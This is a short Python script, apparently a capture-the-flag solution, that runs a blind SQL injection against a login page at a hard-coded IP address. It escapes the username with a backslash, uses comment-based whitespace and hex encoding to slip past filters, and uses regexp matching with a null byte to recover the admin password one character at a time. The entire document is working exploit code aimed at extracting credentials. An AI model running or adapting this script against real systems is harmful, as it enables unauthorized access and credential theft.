import requests
url = "http://35.200.215.237/?user=\&pw=||(user/**/regexp/**/0x61646d696e/**/%26%26/**/pw/**/regexp/**/%22^"

character = [1,2,3,4,5,6,7,8,9,0,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
passowrd_length = 10
password = ""
for i in range(1,passowrd_length):
    password_found = False
    for c in character:
        query = url+(password+str(c)+"%22);%00")
        send_query = requests.get(query)
        if "Welcome admin" in send_query.text:
            password = password + str(c)
            password_found = True
            break
    if password_found == False:
        break

print(password)
